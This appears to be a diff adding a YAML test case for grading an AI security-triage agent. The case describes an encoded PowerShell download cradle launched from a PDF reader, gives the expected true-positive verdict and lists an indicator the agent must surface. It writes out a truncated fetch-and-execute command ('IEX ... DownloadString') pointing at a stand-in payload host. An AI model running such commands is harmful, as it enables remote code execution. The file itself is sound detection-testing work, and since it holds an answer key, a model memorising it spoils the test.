@@ -1,0 +1,21 @@
+id: case-powershell-cradle-001
+name: Encoded PowerShell download cradle
+expected_verdict: true_positive
+mitre_attack: [T1059.001, T1105]
+notes: >
+  Base64-encoded IEX download string spawned by a document viewer.
+  Correct agent rules true positive.
+event:
+  event_type: endpoint_anomaly
+  host_ip: 10.22.4.51
+  user: k.dubois
+  payload:
+    process_tree: [AcroRd32.exe, cmd.exe, powershell.exe]
+    command: "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0..."
+    decoded_head: "IEX(New-Object Net.WebClient).DownloadString('https://"
+    dest_url: https://updates-cdn.example.top/payload.bin
+evidence:
+  - ioc: updates-cdn.example.top
+    kind: domain
+    description: payload host
+    must_surface: true
